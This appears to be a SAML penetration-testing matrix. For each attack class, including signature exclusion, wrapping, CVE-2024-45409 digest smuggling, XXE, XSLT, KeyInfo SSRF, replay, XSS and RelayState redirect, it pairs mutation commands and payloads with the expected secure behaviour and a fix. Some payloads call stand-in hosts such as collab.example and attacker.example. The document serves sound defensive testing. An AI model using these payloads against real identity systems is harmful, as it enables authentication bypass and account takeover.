# SAML Vulnerability Test Matrix

## Table of Contents

- Signature and trust tests
- XML parser and transformation tests
- SAML logic tests
- Reflection and RelayState tests
- Discovery and automation notes
- Remediation checklist

## Signature and Trust Tests

### Missing Signature Verification

Source concept: DAST signature audit and common SAML misconfiguration.

Mutate: change `DigestValue`, `SignatureValue`, or signed assertion content without re-signing.

CLI:

```bash
python3 scripts/saml_cli.py mutate --type tamper-digest --xml response.xml --out bad-digest.xml
python3 scripts/saml_cli.py encode --kind response --xml bad-digest.xml --out bad-digest.b64
```

Secure behavior: ACS rejects with no authenticated session.

Vulnerable behavior: mutated response produces a session similar to valid baseline.

Evidence: baseline vs mutated status, cookies, redirect, authenticated account.

Fix: require signature verification and fail closed on any digest/signature error.

### Signature Exclusion

Source concept: SAML methodology and DAST signature exclusion check.

Mutate: remove the full XMLDSig `Signature` element from `Assertion` or `Response`.

CLI:

```bash
python3 scripts/saml_cli.py mutate --type remove-signature --xml response.xml --out no-signature.xml
python3 scripts/saml_cli.py encode --kind response --xml no-signature.xml --out no-signature.b64
```

Secure behavior: reject unsigned messages unless the deployment has a deliberate, constrained, documented unsigned mode.

Vulnerable behavior: unsigned assertion creates a valid session.

Fix: require signed assertions/responses, reject unsigned authentication assertions.

### XML Signature Wrapping

Source concept: SAML methodology, XML Signature Wrapping write-ups, and library implementation flaws.

Mutate: create more than one assertion or duplicate IDs so one signed element validates while application business logic consumes an attacker-controlled element.

Manual variants:

- Keep the signed assertion intact and add an unsigned assertion before it.
- Move the signed assertion into an unexpected wrapper and place a malicious assertion at the normal path.
- Duplicate `ID`/`AssertionID` references.
- Try namespace and XPath edge cases where library selection differs between signature verification and identity extraction.

Secure behavior: reject multiple assertions, duplicate IDs, unresolved references, references resolving to multiple nodes, or mismatch between signed node and consumed node.

Evidence: identity in session differs from signed assertion or unsigned assertion is consumed.

Fix: resolve `Reference URI` to exactly one element, verify that exact element, consume only the verified element, reject multiple assertions unless explicitly required and safely handled.

### Certificate Faking

Source concept: methodology and certificate-faking write-up category.

Mutate: sign or embed data with an attacker-controlled certificate in `KeyInfo`.

Secure behavior: SP ignores untrusted embedded certs and validates against configured trusted IdP certificates.

Vulnerable behavior: SP accepts any embedded certificate or any cert matching weak metadata.

CLI support:

```bash
openssl req -x509 -newkey rsa:2048 -nodes -keyout fake-idp.key -out fake-idp.crt -subj "/CN=fake-idp"
openssl x509 -in fake-idp.crt -noout -subject -issuer -fingerprint -sha256
```

Fix: pin trusted IdP certificate(s), validate chain/metadata according to deployment policy, and do not trust arbitrary `KeyInfo`.

### Ruby-SAML CVE-2024-45409-Style Digest Smuggling

Source concept: Ruby-SAML/OmniAuth-SAML/GitLab bypass.

Root issue: signature verification code used overly broad XPath such as `//ds:DigestValue` relative to a reference node, allowing a controlled `DigestValue` elsewhere in the document, such as `samlp:Extensions`, to be selected before the signed value.

Mutate:

```bash
python3 scripts/saml_cli.py mutate --type smuggle-digest --xml response.xml --digest-value BASE64_DIGEST --out smuggled.xml
```

Secure behavior: digest lookup is scoped to the exact `Reference` child, signature verification fails for tampered assertions, and references resolving to multiple nodes are rejected.

Vulnerable behavior: modified assertion passes digest comparison because the parser selected the smuggled digest while `SignedInfo` remains valid.

Fix: update vulnerable Ruby-SAML/OmniAuth-SAML dependencies, use strict relative XPath, block references resolving to multiple nodes, and verify the consumed assertion.

### XML Canonicalization of Comments

Source concept: methodology notes mention additional attacks against XML canonicalization of comments.

Mutate: test parser differences around comments, canonicalization transforms, and identity values split by XML comments.

Secure behavior: canonicalization and application extraction produce identical signed/consumed values, or suspicious transform/comment cases are rejected.

Fix: use patched XMLDSig libraries and consume only canonicalized verified values.

## XML Parser and Transformation Tests

### XXE in SAML

Source concept: methodology and DAST ACS endpoint audit.

Mutate: submit a SAML-shaped XML document containing a benign external entity. Parsing happens before signature validation in many stacks, so this can be tested anonymously against ACS when in scope.

CLI:

```bash
python3 scripts/saml_cli.py payload --type xxe --callback-url https://collab.example/xxe --out xxe.xml
python3 scripts/saml_cli.py encode --kind response --xml xxe.xml --out xxe.b64
```

Secure behavior: parser disables DTD/external entities and produces no callback/file disclosure.

Evidence: controlled callback with target metadata, or safe error showing attempted entity processing.

Fix: disable DTDs and external entities, use hardened XML parser settings.

### XSLT Injection in XMLDSig Transforms

Source concept: DAST tests and XSLT-via-SAML methodology.

Mutate: add or replace a signature `Transform` with XSLT content or remote stylesheet reference.

CLI:

```bash
python3 scripts/saml_cli.py payload --type xslt --callback-url https://collab.example/xslt --out xslt.xml
```

Secure behavior: SP rejects XSLT transforms or processes XMLDSig with safe transform allow-list only.

Impact examples: SSRF, local file read in some processors, code execution in unsafe XSLT engines.

Fix: allow-list transforms required for SAML, disable XSLT or external resource access.

### KeyInfo Dereference and SSRF

Source concept: DAST KeyInfo SSRF checks and real-world Santuario/OAM-style issues.

Mutate: include a `KeyInfo` retrieval URL or local path.

CLI:

```bash
python3 scripts/saml_cli.py payload --type keyinfo-ssrf --callback-url https://collab.example/key --out keyinfo.xml
```

Secure behavior: SP never dereferences untrusted `KeyInfo` URLs or file paths.

Evidence: controlled callback, DNS hit, or blocked outbound request logs.

Fix: ignore embedded key retrieval methods; validate only configured IdP keys.

## SAML Logic Tests

### Assertion Replay

Source concept: methodology says replay may or may not be a standalone bug.

Mutate: resubmit the same valid `SAMLResponse` multiple times before and after `NotOnOrAfter`.

Secure behavior: SP enforces `InResponseTo`, assertion ID replay cache, and time windows. Some systems may allow session refresh during the valid window by design; impact depends on context.

Evidence: same assertion creates multiple independent sessions, works after expiration, or works after logout/password change when policy forbids it.

Fix: cache assertion IDs, enforce `NotBefore`/`NotOnOrAfter`, bind response to request and recipient.

### Token Recipient Confusion

Source concept: methodology and Slack/Office365-style write-ups.

Precondition: attacker has a legitimate account at one SP using the same IdP as the target SP, and both are in scope.

Mutate: submit a valid assertion intended for SP-A to SP-B.

Secure behavior: SP-B rejects due to `Audience`, `Recipient`, `Destination`, `InResponseTo`, or issuer mismatch.

Vulnerable behavior: SP-B accepts a token minted for SP-A.

Fix: enforce audience restriction, recipient, ACS destination, issuer, and request correlation.

### Audience, Recipient, Destination, and Issuer Mismatch

Mutate:

- Change `saml:Audience`.
- Change `SubjectConfirmationData Recipient`.
- Change `Response Destination`.
- Change `saml:Issuer`.

Secure behavior: reject every mismatch.

Fix: exact string/URL validation with canonical URL handling and trusted issuer configuration.

### NameID and Attribute Confusion

Mutate: change `NameID`, email, ID, role, groups, or custom attributes without valid signature; test duplicate attributes and unexpected formats.

Secure behavior: reject unsigned changes; when validly signed, map only trusted attributes and require authorization checks in the SP.

Fix: strict claim mapping, least-privilege defaults, no role escalation from untrusted attributes.

## Reflection and RelayState Tests

### SAML Field XSS

Source concept: DAST XSS checks in `SAMLResponse` fields and error messages.

Mutate: put XML-escaped payloads into fields likely checked before signature validation, such as `Issuer` or `Destination`.

CLI:

```bash
python3 scripts/saml_cli.py payload --type xss --xss-payload '<img src=x onerror=alert(1)>' --out xss.xml
```

Secure behavior: errors encode all reflected values and do not execute script.

Fix: output-encode SAML-derived values in every HTML response.

### RelayState Open Redirect

Source concept: methodology example from "Owning SAML".

Mutate: change `RelayState` to external URLs, protocol-relative URLs, encoded URLs, nested URLs, path traversal, and allow-list bypass variants.

CLI:

```bash
printf '%s' 'https://attacker.example/' > relaystate-openredirect.txt
```

Secure behavior: SP only redirects to validated local paths or server-side state entries.

Evidence: post-login redirect to attacker-controlled domain.

Fix: server-side state storage, strict allow-list, relative-path-only redirects.

## Discovery and Automation Notes

Anonymous ACS checks can run when a `SAMLRequest` reveals `AssertionConsumerServiceURL`. Authenticated checks require a valid `SAMLResponse`.

Use nuclei only for reviewed, target-specific templates:

```bash
nuclei -t reviewed-saml-template.yaml -u https://target.example -var SAMLResponse="$(cat mutated.b64)"
```

Do not run broad template packs against IdPs or out-of-scope hosts.

## Remediation Checklist

- Require signed SAML responses/assertions according to policy.
- Verify XMLDSig and digest before consuming claims.
- Consume exactly the signed assertion.
- Reject duplicate IDs, duplicate assertions, ambiguous references, and references resolving to multiple nodes.
- Pin trusted IdP issuer and certificate.
- Enforce `Audience`, `Recipient`, `Destination`, `InResponseTo`, `NotBefore`, and `NotOnOrAfter`.
- Cache assertion IDs to prevent replay.
- Disable XML external entities, DTDs, unsafe transforms, XSLT, and KeyInfo dereferencing.
- Output-encode all SAML-derived error values.
- Store RelayState server-side or restrict it to safe relative paths.
